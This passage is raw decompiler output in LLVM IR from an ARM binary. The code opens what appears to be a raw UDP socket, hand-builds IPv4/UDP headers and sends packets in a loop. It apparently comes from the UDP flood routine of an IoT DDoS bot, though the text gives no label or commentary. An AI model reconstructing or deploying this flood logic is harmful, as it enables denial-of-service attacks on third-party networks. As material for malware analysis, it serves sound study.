  store i16 %v2_c9dc, i16* %v5_c9e4, align 2
  br label %dec_label_pc_c9e8

dec_label_pc_c9e8:                                ; preds = %dec_label_pc_ca90, %dec_label_pc_c9dc
  %v0_c9ec = load i32, i32* %r3.global-to-local, align 4
  %v1_c9ec = add i32 %v0_c9ec, 24
  store i32 %v1_c9ec, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_c9fc = call i32 @function_14b54(i32 2, i32 2, i32 17)
  %v7_ca00 = icmp eq i32 %v3_c9fc, -1
  %v0_ca04 = load i32, i32* @sb, align 4
  %v1_ca04 = add i32 %v0_ca04, 1
  store i32 %v1_ca04, i32* @sb, align 4
  store i32 16, i32* @r2, align 4
  %v1_ca10 = load i32, i32* @fp, align 4
  %v2_ca10 = load i32, i32* @r8, align 4
  %v3_ca10 = add i32 %v2_ca10, %v1_ca10
  %v4_ca10 = inttoptr i32 %v3_ca10 to i32*
  store i32 %v3_c9fc, i32* %v4_ca10, align 4
  br i1 %v7_ca00, label %dec_label_pc_cb38, label %dec_label_pc_ca18

dec_label_pc_ca18:                                ; preds = %dec_label_pc_c9e8
  store i32 2, i32* %stack_var_-56, align 4
  store i32 %v4_ca28, i32* %r3.global-to-local, align 4
  %v3_ca30 = call i32 @function_14770(i32 %v3_c9fc, i32 %v2_ca08, i32 16)
  %v0_ca34 = load i32, i32* @r6, align 4
  %v1_ca34 = add i32 %v0_ca34, 20
  %v2_ca34 = inttoptr i32 %v1_ca34 to i8*
  %v3_ca34 = load i8, i8* %v2_ca34, align 1
  %v4_ca34 = zext i8 %v3_ca34 to i32
  store i32 %v4_ca34, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_ca34, 32
  br i1 %tmp, label %dec_label_pc_caac, label %dec_label_pc_ca40

dec_label_pc_ca40:                                ; preds = %dec_label_pc_ca18
  %v0_ca40 = load i32, i32* @fp, align 4
  %v1_ca40 = load i32, i32* @r8, align 4
  %v2_ca40 = add i32 %v1_ca40, %v0_ca40
  %v3_ca40 = inttoptr i32 %v2_ca40 to i32*
  %v4_ca40 = load i32, i32* %v3_ca40, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_ca4c = call i32 @function_14798(i32 %v4_ca40, i32 %v0_ca34, i32 16)
  %v0_ca50 = load i32, i32* @sb, align 4
  %v1_ca50 = load i32, i32* @r7, align 4
  %v9_ca50 = icmp eq i32 %v0_ca50, %v1_ca50
  %v0_ca54 = load i32, i32* @fp, align 4
  %v1_ca54 = add i32 %v0_ca54, 4
  store i32 %v1_ca54, i32* @fp, align 4
  br i1 %v9_ca50, label %dec_label_pc_cae8, label %dec_label_pc_ca5c

dec_label_pc_ca5c:                                ; preds = %dec_label_pc_caac, %dec_label_pc_ca40, %dec_label_pc_c9cc
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_c9cc ], [ %v1_c9ec, %dec_label_pc_ca40 ], [ %v1_c9ec, %dec_label_pc_caac ]
  store i32 65535, i32* @r4, align 4
  %v2_ca6c = call i32 @function_1320c(i32 65535, i32 1)
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_ca78 = load i32, i32* @r4, align 4
  %v9_ca78 = icmp eq i32 %v3_c940, %v1_ca78
  store i32 %stack_var_-60.0, i32* %r2.global-to-local, align 4
  %v1_ca80 = load i32, i32* @fp, align 4
  %v2_ca80 = load i32, i32* @sl, align 4
  %v3_ca80 = add i32 %v2_ca80, %v1_ca80
  %v4_ca80 = inttoptr i32 %v3_ca80 to i32*
  store i32 %v2_ca6c, i32* %v4_ca80, align 4
  %v0_ca84 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca84 = load i32, i32* %r2.global-to-local, align 4
  %v2_ca84 = add i32 %v1_ca84, %v0_ca84
  store i32 %v2_ca84, i32* @r6, align 4
  br i1 %v9_ca78, label %dec_label_pc_ca90, label %dec_label_pc_c9dc

dec_label_pc_ca90:                                ; preds = %dec_label_pc_ca5c
  %v0_ca90 = call i32 @function_f570()
  %v1_ca90 = trunc i32 %v0_ca90 to i16
  store i32 %stack_var_-60.0, i32* %r2.global-to-local, align 4
  %v2_ca9c = add i32 %stack_var_-60.0, %arg2
  store i32 %v2_ca9c, i32* @r6, align 4
  store i32 %stack_var_-60.0, i32* %r3.global-to-local, align 4
  %v4_caa4 = add i32 %v2_ca9c, 2
  %v5_caa4 = inttoptr i32 %v4_caa4 to i16*
  store i16 %v1_ca90, i16* %v5_caa4, align 2
  br label %dec_label_pc_c9e8

dec_label_pc_caac:                                ; preds = %dec_label_pc_ca18
  %v1_caac = add i32 %v0_ca34, 16
  %v2_caac = inttoptr i32 %v1_caac to i32*
  %v3_caac = load i32, i32* %v2_caac, align 4
  %v1_cab0 = call i32 @function_149d0(i32 %v3_caac)
  store i32 %v1_cab0, i32* @r4, align 4
  %v0_cab8 = call i32 @function_f570()
  %v0_cabc = load i32, i32* @r6, align 4
  %v1_cabc = add i32 %v0_cabc, 20
  %v2_cabc = inttoptr i32 %v1_cabc to i8*
  %v3_cabc = load i8, i8* %v2_cabc, align 1
  %v4_cabc = zext i8 %v3_cabc to i32
  store i32 %v4_cabc, i32* %r3.global-to-local, align 4
  %v0_cac0 = load i32, i32* @r4, align 4
  %v7_cac0 = lshr i32 %v0_cab8, %v4_cabc
  %v8_cac0 = add i32 %v7_cac0, %v0_cac0
  %v1_cac4 = call i32 @function_14828(i32 %v8_cac0)
  %v1_cac8 = load i32, i32* @r6, align 4
  %v2_cac8 = add i32 %v1_cac8, 4
  %v3_cac8 = inttoptr i32 %v2_cac8 to i32*
  store i32 %v1_cac4, i32* %v3_cac8, align 4
  %v0_cacc = load i32, i32* @fp, align 4
  %v1_cacc = load i32, i32* @r8, align 4
  %v2_cacc = add i32 %v1_cacc, %v0_cacc
  %v3_cacc = inttoptr i32 %v2_cacc to i32*
  %v4_cacc = load i32, i32* %v3_cacc, align 4
  %v0_cad0 = load i32, i32* @r6, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cad8 = call i32 @function_14798(i32 %v4_cacc, i32 %v0_cad0, i32 16)
  %v0_cadc = load i32, i32* @sb, align 4
  %v1_cadc = load i32, i32* @r7, align 4
  %v9_cadc = icmp eq i32 %v0_cadc, %v1_cadc
  %v0_cae0 = load i32, i32* @fp, align 4
  %v1_cae0 = add i32 %v0_cae0, 4
  store i32 %v1_cae0, i32* @fp, align 4
  br i1 %v9_cadc, label %dec_label_pc_cae8, label %dec_label_pc_ca5c

dec_label_pc_cae8:                                ; preds = %dec_label_pc_caac, %dec_label_pc_ca40, %dec_label_pc_c9c4
  %v1_cb488 = phi i32 [ 0, %dec_label_pc_c9c4 ], [ %v0_cadc, %dec_label_pc_caac ], [ %v0_ca50, %dec_label_pc_ca40 ]
  store i32 %v1_c998, i32* %r2.global-to-local, align 4
  %v2_caec = icmp eq i32 %v1_c998, 0
  br i1 %v2_caec, label %dec_label_pc_cb0c.outer, label %dec_label_pc_cb44

dec_label_pc_cafc:                                ; preds = %dec_label_pc_cb0c
  store i32 %v1_cb00, i32* @r4, align 4
  store i32 %v0_cb10, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_cafc = load i32, i32* @r8, align 4
  %v4_cafc = mul i32 %v1_cb00, 4
  %v5_cafc = add i32 %v0_cafc, %v4_cafc
  %v6_cafc = inttoptr i32 %v5_cafc to i32*
  %v7_cafc = load i32, i32* %v6_cafc, align 4
  store i32 %v7_cafc, i32* @r0, align 4
  %v0_cb00 = load i32, i32* @sl, align 4
  %v5_cb00 = add i32 %v0_cb00, %v4_cafc
  %v6_cb00 = inttoptr i32 %v5_cb00 to i32*
  %v7_cb00 = load i32, i32* %v6_cb00, align 4
  store i32 %v7_cb00, i32* @r1, align 4
  %v4_cb04 = call i32 @function_14a74(i32 %v7_cafc, i32 %v7_cb00, i32 %v0_cb10, i32 16384)
  %v0_cb08 = load i32, i32* @r4, align 4
  %v1_cb08 = add i32 %v0_cb08, 1
  %v0_cb0c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cb0c.outer

dec_label_pc_cb0c.outer:                          ; preds = %dec_label_pc_cae8, %dec_label_pc_cafc
  %v0_cb0c.ph = phi i32 [ %v0_cb0c.pre.pre, %dec_label_pc_cafc ], [ %v1_cb488, %dec_label_pc_cae8 ]
  %v1_cb00.ph = phi i32 [ %v1_cb08, %dec_label_pc_cafc ], [ 0, %dec_label_pc_cae8 ]
  %v0_cb10 = load i32, i32* @r5, align 4
  br label %dec_label_pc_cb0c

dec_label_pc_cb0c:                                ; preds = %dec_label_pc_cb0c.outer, %dec_label_pc_cb0c
  %v1_cb00 = phi i32 [ 0, %dec_label_pc_cb0c ], [ %v1_cb00.ph, %dec_label_pc_cb0c.outer ]
  %v8_cb18 = icmp sgt i32 %v0_cb0c.ph, %v1_cb00
  br i1 %v8_cb18, label %dec_label_pc_cafc, label %dec_label_pc_cb0c

dec_label_pc_cb24:                                ; preds = %dec_label_pc_c8ec
  %v0_cb24 = call i32 @function_f570()
  %v5_cb30 = trunc i32 %v0_cb24 to i16
  br label %dec_label_pc_c9c4

dec_label_pc_cb38:                                ; preds = %dec_label_pc_c9e8
  store i32 %v18_c8ec, i32* %sb.global-to-local, align 4
  ret i32 %v3_c9fc

dec_label_pc_cb44:                                ; preds = %dec_label_pc_cb48, %dec_label_pc_cae8
  %v1_cb487 = phi i32 [ %v1_cb488, %dec_label_pc_cae8 ], [ %v1_cb48, %dec_label_pc_cb48 ]
  br label %dec_label_pc_cb48

dec_label_pc_cb48:                                ; preds = %dec_label_pc_cb54, %dec_label_pc_cb44
  %v1_cb48 = phi i32 [ %v1_cb487, %dec_label_pc_cb44 ], [ %v1_cb48.pre, %dec_label_pc_cb54 ]
  %v1_cb54 = phi i32 [ 0, %dec_label_pc_cb44 ], [ %v1_cb74, %dec_label_pc_cb54 ]
  store i32 %v1_cb54, i32* @r6, align 4
  %v6_cb50 = icmp slt i32 %v1_cb54, %v1_cb48
  br i1 %v6_cb50, label %dec_label_pc_cb54, label %dec_label_pc_cb44

dec_label_pc_cb54:                                ; preds = %dec_label_pc_cb48
  %v0_cb4c = load i32, i32* @r5, align 4
  %v0_cb54 = load i32, i32* @sl, align 4
  %v4_cb54 = mul i32 %v1_cb54, 4
  %v5_cb54 = add i32 %v0_cb54, %v4_cb54
  %v6_cb54 = inttoptr i32 %v5_cb54 to i32*
  %v7_cb54 = load i32, i32* %v6_cb54, align 4
  store i32 %v7_cb54, i32* @r4, align 4
  %v2_cb5c = inttoptr i32 %v7_cb54 to i16*
  %v3_cb5c = call i32 @function_f770(i16* %v2_cb5c, i32 %v0_cb4c)
  %v0_cb60 = load i32, i32* @r8, align 4
  %v1_cb60 = load i32, i32* @r6, align 4
  %v4_cb60 = mul i32 %v1_cb60, 4
  %v5_cb60 = add i32 %v4_cb60, %v0_cb60
  %v6_cb60 = inttoptr i32 %v5_cb60 to i32*
  %v7_cb60 = load i32, i32* %v6_cb60, align 4
  store i32 %v7_cb60, i32* @r0, align 4
  %v0_cb64 = load i32, i32* @r4, align 4
  store i32 %v0_cb64, i32* @r1, align 4
  %v0_cb68 = load i32, i32* @r5, align 4
  store i32 %v0_cb68, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_cb70 = call i32 @function_14a74(i32 %v7_cb60, i32 %v0_cb64, i32 %v0_cb68, i32 16384)
  %v0_cb74 = load i32, i32* @r6, align 4
  %v1_cb74 = add i32 %v0_cb74, 1
  %v1_cb48.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cb48

; uselistorder directives
  uselistorder i32 %v1_cb48, { 1, 0 }
  uselistorder i32 %v1_cb00, { 2, 1, 0 }
  uselistorder i32 %v0_cb10, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v3_c9fc, { 1, 3, 2, 0 }
  uselistorder i32 %v1_c998, { 1, 0 }
  uselistorder i32 %v3_c940, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 16, 2, 3, 9, 10, 4, 5, 6, 7, 8, 12, 11, 13, 14, 15, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 7, 4, 5, 9, 8, 10, 11, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_cb0c, { 1, 0 }
  uselistorder label %dec_label_pc_cb0c.outer, { 1, 0 }
}

define i32 @function_cb7c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_cb7c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_cb7c = load i32, i32* @r4, align 4
  %v18_cb7c = load i32, i32* @sb, align 4
  %v27_cb7c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_cb98 = call i32 @function_1320c(i32 %arg1, i32 4)
  %v0_cb9c = load i32, i32* @r5, align 4
  store i32 %v0_cb9c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cbac = load i32, i32* @r4, align 4
  %v5_cbb0 = inttoptr i32 %v0_cb9c to i32*
  %v6_cbb0 = call i32 @function_a430(i32 %v0_cbac, i32* %v5_cbb0, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_cbc8 = load i32, i32* @r5, align 4
  store i32 %v0_cbc8, i32* %r1.global-to-local, align 4
  %v0_cbcc = load i32, i32* @r4, align 4
  %v5_cbd0 = trunc i32 %v6_cbb0 to i8
  %v6_cbd4 = inttoptr i32 %v0_cbc8 to i32*
  %v7_cbd4 = call i32 @function_a430(i32 %v0_cbcc, i32* %v6_cbd4, i32 3, i32 65535)
  %v0_cbd8 = load i32, i32* @r5, align 4
  store i32 %v0_cbd8, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_cbe8 = load i32, i32* @r4, align 4
  %v5_cbec = inttoptr i32 %v0_cbd8 to i32*
  %v6_cbec = call i32 @function_a430(i32 %v0_cbe8, i32* %v5_cbec, i32 4, i32 64)
  %v0_cbf8 = load i32, i32* @r5, align 4
  store i32 %v0_cbf8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cc04 = load i32, i32* @r4, align 4
  %v6_cc0c = inttoptr i32 %v0_cbf8 to i32*
  %v7_cc0c = call i32 @function_a430(i32 %v0_cc04, i32* %v6_cc0c, i32 5, i32 0)
  %v1_cc18 = urem i32 %v7_cc0c, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_cc24 = load i32, i32* @r5, align 4
  store i32 %v0_cc24, i32* %r1.global-to-local, align 4
  %v0_cc28 = load i32, i32* @r4, align 4
  %v5_cc30 = inttoptr i32 %v0_cc24 to i32*
  %v6_cc30 = call i32 @function_a430(i32 %v0_cc28, i32* %v5_cc30, i32 6, i32 65535)
  %v0_cc38 = load i32, i32* @r5, align 4
  store i32 %v0_cc38, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v6_cc30, i32* %sb.global-to-local, align 4
  %v0_cc48 = load i32, i32* @r4, align 4
  %v4_cc4c = inttoptr i32 %v0_cc38 to i32*
  %v5_cc4c = call i32 @function_a430(i32 %v0_cc48, i32* %v4_cc4c, i32 7, i32 65535)
  %v0_cc50 = load i32, i32* @r5, align 4
  store i32 %v0_cc50, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_cc4c, i32* @sl, align 4
  %v0_cc60 = load i32, i32* @r4, align 4
  %v4_cc64 = inttoptr i32 %v0_cc50 to i32*
  %v5_cc64 = call i32 @function_a430(i32 %v0_cc60, i32* %v4_cc64, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cc70 = load i32, i32* @r5, align 4
  store i32 %v0_cc70, i32* %r1.global-to-local, align 4
  store i32 %v5_cc64, i32* @r6, align 4
  %v0_cc78 = load i32, i32* @r4, align 4
  %v4_cc7c = inttoptr i32 %v0_cc70 to i32*
  %v5_cc7c = call i32 @function_a430(i32 %v0_cc78, i32* %v4_cc7c, i32 1, i32 1)
  %v2_cc88 = load i32, i32* @global_var_2290c.90, align 4
  store i32 %v2_cc88, i32* %r3.global-to-local, align 4
  %v1_cc8c = urem i32 %v5_cc7c, 256
  %v0_cc90 = load i32, i32* @r5, align 4
  store i32 %v0_cc90, i32* %r1.global-to-local, align 4
  %v0_cc98 = load i32, i32* @r4, align 4
  %v5_cca0 = inttoptr i32 %v0_cc90 to i32*
  %v6_cca0 = call i32 @function_a430(i32 %v0_cc98, i32* %v5_cca0, i32 25, i32 %v2_cc88)
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_ccb4 = call i32 @function_14b54(i32 2, i32 3, i32 17)
  store i32 %v3_ccb4, i32* @r0, align 4
  %v7_ccb8 = icmp eq i32 %v3_ccb4, -1
  store i1 %v7_ccb8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ccb4, i32* @fp, align 4
  br i1 %v7_ccb8, label %dec_label_pc_d014, label %dec_label_pc_ccc4

dec_label_pc_ccc4:                                ; preds = %dec_label_pc_cb7c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_cccc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_cccc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_cce0 = call i32 @function_14ae4(i32 %v3_ccb4, i32 0, i32 3, i32 %v6_cccc, i32 ptrtoint (i32* @0 to i32))
  %v7_cce4 = icmp eq i32 %v5_cce0, -1
  store i1 %v7_cce4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cce4, label %dec_label_pc_d00c, label %dec_label_pc_ccec

dec_label_pc_ccec:                                ; preds = %dec_label_pc_ccc4
  %v0_ccec = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ccf8 = urem i32 %v0_ccec, 65536
  %v3_ccfc = icmp ugt i32 %v3_ccf8, 1459
  %v9_ccfc = icmp eq i32 %v3_ccf8, 1460
  store i1 %v9_ccfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ccfc, label %bb, label %bb40

bb:                                               ; preds = %dec_label_pc_ccec
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_ccec, %bb
  %v0_cd04 = phi i32 [ %v3_ccf8, %dec_label_pc_ccec ], [ 1460, %bb ]
  %v0_cd08 = load i32, i32* %sb.global-to-local, align 4
  %v3_cd10 = urem i32 %v0_cd08, 65536
  store i32 %v3_cd10, i32* %r3.global-to-local, align 4
  %v0_cd14 = load i32, i32* @r7, align 4
  %v2_cd14 = icmp eq i32 %v0_cd14, 0
  store i1 %v2_cd14, i1* %cpsr_z.global-to-local, align 1
  %v3_cd18 = mul i32 %v7_cbd4, 65536
  store i32 %v3_cd18, i32* %r1.global-to-local, align 4
  %v0_cd20 = load i32, i32* @sl, align 4
  br i1 %v2_cd14, label %bb41, label %bb42

bb41:                                             ; preds = %bb40
  store i32 %v0_cd04, i32* %r3.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %bb40, %bb41
  %v1_cd44 = phi i32 [ %v3_cd10, %bb40 ], [ %v0_cd04, %bb41 ]
  %v3_cd2c = urem i32 %v7_cbd4, 65536
  store i32 %v3_cd2c, i32* %r1.global-to-local, align 4
  %v3_cd30 = urem i32 %v0_cd20, 65536
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_cd14, label %.thread, label %dec_label_pc_cd4c

.thread:                                          ; preds = %bb42
  %v2_cd40 = add nsw i32 %v1_cd44, 28
  store i32 %v2_cd40, i32* @sb, align 4
  %v2_cd44 = add nsw i32 %v1_cd44, 8
  store i32 %v2_cd44, i32* @sl, align 4
  br label %dec_label_pc_cf4c.preheader

dec_label_pc_cd4c:                                ; preds = %bb42
  %v1_cd50 = add nuw nsw i32 %v0_cd04, 8
  store i32 %v1_cd50, i32* @sl, align 4
  %v1_cd54 = add nuw nsw i32 %v0_cd04, 28
  store i32 %v1_cd54, i32* @sb, align 4
  %v3_cd60 = urem i32 %v1_cd54, 65536
  store i32 %v3_cd60, i32* %r3.global-to-local, align 4
  %v3_cd64 = urem i32 %v1_cd50, 65536
  store i32 %v3_cd64, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v2_ce38 = icmp eq i32 %v1_cc18, 0
  %sext = mul i32 %v6_cbec, 16777216
  %v3_ce34 = sdiv i32 %sext, 16777216
  br label %dec_label_pc_cdd4

dec_label_pc_cd74:                                ; preds = %dec_label_pc_cdd4, %dec_label_pc_ce4c
  %v2_cd78 = phi i32 [ %v0_ce44, %dec_label_pc_cdd4 ], [ %v2_cd78.pre, %dec_label_pc_ce4c ]
  %v3_cd78 = add i32 %v2_cd78, 9
  %v4_cd78 = inttoptr i32 %v3_cd78 to i8*
  store i8 17, i8* %v4_cd78, align 1
  %v3_cd7c = load i32, i32* %stack_var_-44, align 4
  %v5_cd84 = mul i32 %v3_cd7c, 24
  store i32 %v5_cd84, i32* %r3.global-to-local, align 4
  %v1_cd8c = load i32, i32* %r4.global-to-local, align 4
  %v2_cd8c = add i32 %v1_cd8c, 12
  %v3_cd8c = inttoptr i32 %v2_cd8c to i32*
  store i32 %v6_cca0, i32* %v3_cd8c, align 4
  %v0_cd90 = load i32, i32* %r3.global-to-local, align 4
  %v1_cd90 = load i32, i32* @r8, align 4
  %v2_cd90 = add i32 %v1_cd90, %v0_cd90
  store i32 %v2_cd90, i32* %r3.global-to-local, align 4
  %v1_cd94 = add i32 %v2_cd90, 16
  %v2_cd94 = inttoptr i32 %v1_cd94 to i32*
  %v3_cd94 = load i32, i32* %v2_cd94, align 4
  %v1_cd9c = load i32, i32* %r4.global-to-local, align 4
  %v2_cd9c = add i32 %v1_cd9c, 16
  %v3_cd9c = inttoptr i32 %v2_cd9c to i32*
  store i32 %v3_cd94, i32* %v3_cd9c, align 4
  %v1_cda0 = call i32 @function_1484c(i32 %v3_cd10)
  %v2_cda0 = trunc i32 %v1_cda0 to i16
  %v3_cda4 = load i32, i32* %r4.global-to-local, align 4
  %v4_cda4 = add i32 %v3_cda4, 20
  %v5_cda4 = inttoptr i32 %v4_cda4 to i16*
  store i16 %v2_cda0, i16* %v5_cda4, align 2
  %v1_cdac = call i32 @function_1484c(i32 %v3_cd30)
  %v2_cdac = trunc i32 %v1_cdac to i16
  %v3_cdb0 = load i32, i32* @r5, align 4
  %v4_cdb0 = add i32 %v3_cdb0, 2
  %v5_cdb0 = inttoptr i32 %v4_cdb0 to i16*
  store i16 %v2_cdac, i16* %v5_cdb0, align 2
  %v0_cdb4 = load i32, i32* @r6, align 4
  %v1_cdb8 = call i32 @function_1484c(i32 %v0_cdb4)
  %v2_cdb8 = trunc i32 %v1_cdb8 to i16
  %v3_cdbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cdbc, i32* %r3.global-to-local, align 4
  %v1_cdc0 = add i32 %v3_cdbc, 1
  store i32 %v1_cdc0, i32* @r4, align 4
  %v1_cdc4 = load i32, i32* @r7, align 4
  %v9_cdc4 = icmp eq i32 %v1_cdc0, %v1_cdc4
  store i1 %v9_cdc4, i1* %cpsr_z.global-to-local, align 1
  %v3_cdc8 = load i32, i32* @r5, align 4
  %v4_cdc8 = add i32 %v3_cdc8, 4
  %v5_cdc8 = inttoptr i32 %v4_cdc8 to i16*
  store i16 %v2_cdb8, i16* %v5_cdc8, align 2
  %v0_cdcc = load i32, i32* @r4, align 4
  store i32 %v0_cdcc, i32* %stack_var_-44, align 4
  %v6_cdd0 = icmp slt i32 %v1_cdc0, %v1_cdc4
  br i1 %v6_cdd0, label %dec_label_pc_cdd4, label %dec_label_pc_cf4c.preheader.loopexit

dec_label_pc_cf4c.preheader.loopexit:             ; preds = %dec_label_pc_cd74
  %v0_cf50.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cf4c.preheader

dec_label_pc_cf4c.preheader:                      ; preds = %.thread, %dec_label_pc_cf4c.preheader.loopexit
  %v0_cf50.pre = phi i32 [ %v0_cf50.pre.pre, %dec_label_pc_cf4c.preheader.loopexit ], [ 0, %.thread ]
  %v3_cfb0 = icmp eq i32 %v6_cca0, -1
  %v8_cfb0 = icmp eq i32 %v6_cca0, -1
  %v3_cfcc = icmp eq i32 %v3_cd2c, 65535
  %v2_cec0 = icmp eq i32 %v1_cc8c, 0
  br label %dec_label_pc_cf4c

dec_label_pc_cdd4:                                ; preds = %dec_label_pc_cd74, %dec_label_pc_cd4c
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cde0 = call i32 @function_1320c(i32 1510, i32 1)
  store i32 %v2_cb98, i32* %r1.global-to-local, align 4
  %v3_cde8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cde8, i32* %r3.global-to-local, align 4
  %v2_cdec = load i32, i32* @r4, align 4
  %v5_cdec = mul i32 %v2_cdec, 4
  %v6_cdec = add i32 %v5_cdec, %v2_cb98
  %v7_cdec = inttoptr i32 %v6_cdec to i32*
  store i32 %v2_cde0, i32* %v7_cdec, align 4
  %v0_cdf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_cdf0 = load i32, i32* %r3.global-to-local, align 4
  %v4_cdf0 = mul i32 %v1_cdf0, 4
  %v5_cdf0 = add i32 %v4_cdf0, %v0_cdf0
  %v6_cdf0 = inttoptr i32 %v5_cdf0 to i32*
  %v7_cdf0 = load i32, i32* %v6_cdf0, align 4
  store i32 %v7_cdf0, i32* %r4.global-to-local, align 4
  %v1_cdf4 = inttoptr i32 %v7_cdf0 to i8*
  %v2_cdf4 = load i8, i8* %v1_cdf4, align 1
  %tmp = urem i8 %v2_cdf4, 16
  %v1_cdfc = or i8 %tmp, 64
  store i8 %v1_cdfc, i8* %v1_cdf4, align 1
  %v0_ce04 = load i32, i32* %r4.global-to-local, align 4
  %v1_ce04 = inttoptr i32 %v0_ce04 to i8*
  %v2_ce04 = load i8, i8* %v1_ce04, align 1
  %v3_ce04 = zext i8 %v2_ce04 to i32
  %v1_ce08 = and i32 %v3_ce04, 240
  %v1_ce0c = or i32 %v1_ce08, 5
  store i32 %v1_ce0c, i32* %r3.global-to-local, align 4
  %v1_ce10 = trunc i32 %v1_ce0c to i8
  store i8 %v1_ce10, i8* %v1_ce04, align 1
  %v2_ce18 = load i32, i32* %r4.global-to-local, align 4
  %v3_ce18 = add i32 %v2_ce18, 1
  %v4_ce18 = inttoptr i32 %v3_ce18 to i8*
  store i8 %v5_cbd0, i8* %v4_ce18, align 1
  %v1_ce20 = call i32 @function_1484c(i32 %v3_cd60)
  %v2_ce20 = trunc i32 %v1_ce20 to i16
  %v3_ce24 = load i32, i32* %r4.global-to-local, align 4
  %v4_ce24 = add i32 %v3_ce24, 2
  %v5_ce24 = inttoptr i32 %v4_ce24 to i16*
  store i16 %v2_ce20, i16* %v5_ce24, align 2
  %v1_ce2c = call i32 @function_1484c(i32 %v3_cd2c)
  %v2_ce2c = trunc i32 %v1_ce2c to i16
  store i32 %v3_ce34, i32* %r1.global-to-local, align 4
  store i32 %v1_cc18, i32* %r3.global-to-local, align 4
  store i1 %v2_ce38, i1* %cpsr_z.global-to-local, align 1
  %v3_ce3c = load i32, i32* %r4.global-to-local, align 4
  %v4_ce3c = add i32 %v3_ce3c, 4
  %v5_ce3c = inttoptr i32 %v4_ce3c to i16*
  store i16 %v2_ce2c, i16* %v5_ce3c, align 2
  %v0_ce40 = load i32, i32* %r1.global-to-local, align 4
  %v1_ce40 = trunc i32 %v0_ce40 to i8
  %v2_ce40 = load i32, i32* %r4.global-to-local, align 4
  %v3_ce40 = add i32 %v2_ce40, 8
  %v4_ce40 = inttoptr i32 %v3_ce40 to i8*
  store i8 %v1_ce40, i8* %v4_ce40, align 1
  %v0_ce44 = load i32, i32* %r4.global-to-local, align 4
  %v1_ce44 = add i32 %v0_ce44, 20
  store i32 %v1_ce44, i32* @r5, align 4
  %v0_ce48 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ce48, label %dec_label_pc_cd74, label %dec_label_pc_ce4c

dec_label_pc_ce4c:                                ; preds = %dec_label_pc_cdd4
  %v1_ce50 = call i32 @function_1484c(i32 16384)
  %v2_ce50 = trunc i32 %v1_ce50 to i16
  %v3_ce54 = load i32, i32* %r4.global-to-local, align 4
  %v4_ce54 = add i32 %v3_ce54, 6
  %v5_ce54 = inttoptr i32 %v4_ce54 to i16*
  store i16 %v2_ce50, i16* %v5_ce54, align 2
  %v2_cd78.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cd74

dec_label_pc_ce5c:                                ; preds = %dec_label_pc_cf4c
  br label %dec_label_pc_ce60

dec_label_pc_ce60:                                ; preds = %dec_label_pc_cec8, %dec_label_pc_ce5c
  %v1_ce74 = phi i32 [ %v1_cf3c, %dec_label_pc_cec8 ], [ 0, %dec_label_pc_ce5c ]
  %v5_ce64 = mul i32 %v1_ce74, 24
  %v1_ce68 = load i32, i32* @r8, align 4
